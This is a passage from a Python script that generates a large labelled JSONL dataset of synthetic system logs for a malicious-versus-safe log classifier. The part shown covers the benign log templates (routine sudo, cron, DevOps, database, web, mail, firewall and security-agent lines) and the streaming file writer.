            f"sudo: {u} : TTY=pts/{random.randint(0,3)} ; PWD=/root ; USER=root ; COMMAND=/usr/bin/systemctl restart docker",
            f"sudo: {u} : TTY=pts/{random.randint(0,3)} ; PWD=/etc/ufw ; USER=root ; COMMAND=/usr/bin/ufw status verbose",
            f"sudo: {u} : TTY=pts/{random.randint(0,3)} ; PWD=/home/{u} ; USER=root ; COMMAND=/usr/bin/iptables -L -n -v",
            f"sudo: {u} : TTY=pts/{random.randint(0,3)} ; PWD=/etc/netplan ; USER=root ; COMMAND=/usr/sbin/netplan apply"
        ])
        log = f"{ts} {h} {auth_variant}"
        return log, "INTERNAL", "AUTH_BENIGN"

    elif category_id == 3:
        # 3. Cron & Scheduled Database Maintenance
        cron_variant = random.choice([
            f"CRON[{pid}]: (root) CMD (test -x /usr/sbin/anacron || {{ cd / && run-parts --report /etc/cron.daily; }})",
            f"CRON[{pid}]: (postgres) CMD (pg_dump -U postgres -d production_db -c \"VACUUM FULL ANALYZE;\")",
            f"CRON[{pid}]: (root) CMD (/usr/bin/python3 /opt/monitoring/health_check.py > /dev/null 2>&1)",
            f"CRON[{pid}]: (root) CMD (test -x /usr/bin/certbot && certbot -q renew)",
            f"CRON[{pid}]: (postgres) CMD (vacuumdb --all --analyze-only)",
            f"CRON[{pid}]: (root) CMD (/usr/bin/rsync -az /var/www/ /mnt/backup/www/)",
            f"CRON[{pid}]: (root) CMD (python3 /usr/local/bin/log_analyzer.py)",
            f"CRON[{pid}]: (root) CMD (/usr/local/bin/check_disk_space.sh)",
            f"CRON[{pid}]: (postgres) CMD (pg_dumpall -U postgres | gzip > /var/backups/pg_dump.gz)"
        ])
        log = f"{ts} {h} {cron_variant}"
        return log, "INTERNAL", "CRON_SERVICE"

    elif category_id == 4:
        # 4. DevOps, CI/CD, Docker & K8s Orchestration
        cid = hex_id
        devops_variant = random.choice([
            f"dockerd[{pid}]: msg=\"Executing container health check\" container={cid}",
            f"dockerd[{pid}]: msg=\"Container exec started\" container={cid} cmd=\"python3 manage.py migrate\"",
            f"dockerd[{pid}]: msg=\"Health check passed\" container={cid}",
            f"kubelet[{pid}]: I0818 {ts}.{random.randint(100,999)} {pid} pod_workers.go:1200] Syncing pod \"redis-cache-{random.randint(100,999)}\"",
            f"sudo: {u} : TTY=pts/2 ; PWD=/home/{u} ; USER=root ; COMMAND=/usr/bin/kubectl get pods -A",
            f"sudo: {u} : TTY=pts/1 ; PWD=/home/{u} ; USER=root ; COMMAND=/usr/bin/docker compose ps",
            f"sudo: {u} : TTY=pts/0 ; PWD=/var/www/app ; USER=root ; COMMAND=/usr/bin/git pull origin release-v2.1",
            f"sudo: {u} : TTY=pts/1 ; PWD=/app ; USER=root ; COMMAND=/usr/bin/pip install -r requirements.txt",
            f"terraform[{pid}]: Apply complete! Resources: 3 added, 1 changed, 0 destroyed.",
            f"ansible-playbook[{pid}]: ok: [{h}] => {{\"changed\": false, \"msg\": \"Packages up to date\"}}",
            f"gitlab-runner[{pid}]: Job {random.randint(10000,99999)} succeeded for commit {hex_id[:8]}"
        ])
        log = f"{ts} {h} {devops_variant}"
        return log, "INTERNAL", "DEVOPS_CONTAINER"

    elif category_id == 5:
        # 5. Database Clusters (PostgreSQL, MySQL, Redis, MongoDB, Kafka, Elasticsearch)
        db_variant = random.choice([
            f"postgres[{pid}]: [2-1] user={u},db=app_db LOG: statement: SELECT id, name, email FROM users WHERE status = 'active' LIMIT 100;",
            f"postgres[{pid}]: [3-1] user={u},db=app_db LOG: duration: {random.uniform(0.5, 12.0):.3f} ms statement: COMMIT;",
            f"postgres[{pid}]: [1-1] LOG: checkpoint starting: time",
            f"postgres[{pid}]: [1-2] LOG: checkpoint complete: wrote {random.randint(100,5000)} buffers; 0 WAL file(s) added",
            f"mysqld[{pid}]: {ts} {pid} [Note] InnoDB: Buffer pool(s) load completed at {ts}",
            f"redis[{pid}]: DB saved on disk; RDB snapshot created in {random.randint(10,200)} ms",
            f"redis[{pid}]: {random.randint(1,10)} clients connected, {random.randint(100,5000)} bytes in use",
            f"kafka[{pid}]: [KafkaServer id=1] result Log directory /var/lib/kafka/data has {random.randint(50,500)} GB free space",
            f"elasticsearch[{pid}]: [node-1] cluster health status changed from [YELLOW] to [GREEN]"
        ])
        log = f"{ts} {h} {db_variant}"
        return log, "INTERNAL", "DATABASE_BENIGN"

    elif category_id == 6:
        # 6. Web Server Access Logs (Nginx / Apache / Traefik)
        status = random.choice([200, 200, 200, 201, 204, 301, 304, 404])
        size = random.randint(120, 150000)
        web_path = random.choice(WEB_ASSETS + API_ENDPOINTS)
        web_variant = random.choice([
            f"nginx[{pid}]: {wan_ip} - - {ts_apache} \"GET {web_path} HTTP/1.1\" {status} {size} \"https://company.com/\" \"{ua}\"",
            f"nginx[{pid}]: {wan_ip} - - {ts_apache} \"POST /api/v1/{res} HTTP/1.1\" 200 {random.randint(200,3000)} \"-\" \"{ua}\"",
            f"nginx[{pid}]: {wan_ip} - - {ts_apache} \"OPTIONS /api/v1/checkout HTTP/1.1\" 204 0 \"-\" \"{ua}\"",
            f"apache2[{pid}]: {wan_ip} - - {ts_apache} \"GET {web_path} HTTP/1.1\" {status} {size}"
        ])
        log = f"{ts} {h} {web_variant}"
        return log, "EXTERNAL", "WEB_BENIGN"

    elif category_id == 7:
        # 7. Mail Infrastructure & Metrics Telemetry
        app_variant = random.choice([
            f"prometheus[{pid}]: level=info ts={ts}.000Z msg=\"Scrape loop completed\" duration=12.4ms",
            f"rsyslogd: [origin software=\"rsyslogd\" swVersion=\"8.2112.0\"] action 'action-1-builtin:omfile' resumed",
            f"postfix/smtpd[{pid}]: connect from mail-out.{wan_ip}.com[{wan_ip}]",
            f"postfix/qmgr[{pid}]: {hex_id}: from=<info@customer.com>, size={random.randint(500,5000)}, nrcpt=1 (queue active)",
            f"gunicorn[{pid}]: [INFO] Booting worker with pid: {random.randint(1000,9999)}",
            f"python3[{pid}]: INFO:uvicorn.error:Started server process [{pid}]",
            f"node[{pid}]: Express server started on http://127.0.0.1:8080",
            f"certbot[{pid}]: Renewal configuration file /etc/letsencrypt/renewal/site.conf is valid."
        ])
        log = f"{ts} {h} {app_variant}"
        return log, "INTERNAL", "APP_BENIGN"

    elif category_id == 8:
        # 8. Firewall & Network Inbound Allow Rules
        ufw_variant = random.choice([
            f"ufw[{pid}]: [UFW ALLOW] IN=eth0 OUT= SRC={wan_ip} DST=10.0.0.5 PROTO=TCP SPT={random.randint(1024,65535)} DPT={random.choice([80, 443])}",
            f"ufw[{pid}]: [UFW ALLOW] IN=eth0 OUT= SRC={lan_ip} DST=10.0.0.1 PROTO=TCP SPT=53210 DPT=22",
            f"named[{pid}]: valid DNSKEY: . SOA: rcode 0, error: none, flags: qr rd ra ad"
        ])
        log = f"{ts} {h} {ufw_variant}"
        return log, "EXTERNAL", "FIREWALL_BENIGN"

    else:
        # 9. Enterprise Security Daemons (Clean State)
        sec_variant = random.choice([
            f"freshclam[{pid}]: daily.cvd updated (version: 26800, sigs: 2041200)",
            f"wazuh-agent[{pid}]: INFO: Connected to the server (10.0.0.2:1514/tcp)",
            f"fail2ban.actions[{pid}]: NOTICE [sshd] Unban {wan_ip}",
            f"auditd[{pid}]: Audit daemon status: processing=0, total=120, system_free=85%"
        ])
        log = f"{ts} {h} {sec_variant}"
        return log, "INTERNAL", "SECURITY_AGENT"

# ==================================================================================
# 5. YÜKSEK HIZLI STREAMING & CHUNKED BUFFER ENGINE (3 MİLYON+ LOG)
# ==================================================================================

def generate_streaming_dataset(total_samples=3000000, output_path="dataset_3m.jsonl", chunk_size=50000):
    print("=" * 75)
    print(f"  COMBINATORIAL LOG DATASET ENGINE ({total_samples:,} SAMPLES) ")
    print("=" * 75)
    print(f"[*] Output File   : {output_path}")
    print(f"[*] Total Samples : {total_samples:,} (50% Malicious, 50% Safe)")
    print(f"[*] Buffer Size   : {chunk_size:,} logs / batch (Streaming Mode)\n")

    start_time = time.time()
    written_count = 0

    with open(output_path, "w", encoding="utf-8", buffering=1024*1024*16) as f:
        buffer = []

        for i in range(total_samples):
            if i % 2 == 0:
                text, net, cat, mitre, crit = generate_combinatorial_malicious()
                item = {
                    "text": text,
                    "label": 1,
                    "label_name": "MALICIOUS",
                    "network_type": net,
                    "category": cat,
                    "mitre_id": mitre,
                    "criticality": crit
                }
            else:
                text, net, cat = generate_combinatorial_safe()
                item = {
                    "text": text,
                    "label": 0,
                    "label_name": "SAFE",
                    "network_type": net,
                    "category": cat,
                    "mitre_id": "N/A",
                    "criticality": "LOW"
                }

            buffer.append(json.dumps(item, ensure_ascii=False) + "\n")

            if len(buffer) >= chunk_size:
                f.writelines(buffer)
                written_count += len(buffer)
                buffer.clear()

                rate = written_count / (time.time() - start_time)
                percent = (written_count / total_samples) * 100
                print(f"  [+] Progress: {written_count:,}/{total_samples:,} ({percent:.1f}%) | Throughput: {rate:,.0f} logs/sec")

        if buffer:
            f.writelines(buffer)
            written_count += len(buffer)
            buffer.clear()

    total_elapsed = time.time() - start_time
    file_size_mb = os.path.getsize(output_path) / (1024 * 1024)
    print("\n" + "=" * 75)
    print(f"[OK] {written_count:,} Logs Generated Successfully!")
    print(f"[OK] Total File Size    : {file_size_mb:.2f} MB")
    print(f"[OK] Elapsed Time       : {total_elapsed:.2f} seconds")
    print(f"[OK] Average Throughput : {written_count / total_elapsed:,.0f} logs/sec")
    print("=" * 75)

def main():
    parser = argparse.ArgumentParser(description="Combinatorial Log Dataset Generation Engine")
    parser.add_argument("--samples", type=int, default=3000000, help="Total sample count (Default: 3000000)")
    parser.add_argument("--output", type=str, default=None, help="Output file path (e.g. dataset_3m.jsonl)")
    args = parser.parse_args()

    n = args.samples
    out = args.output
    if not out:
        out = f"dataset_{n}.jsonl" if n != 3000000 else "dataset_3m.jsonl"

    generate_streaming_dataset(total_samples=n, output_path=out)

if __name__ == "__main__":
    main()

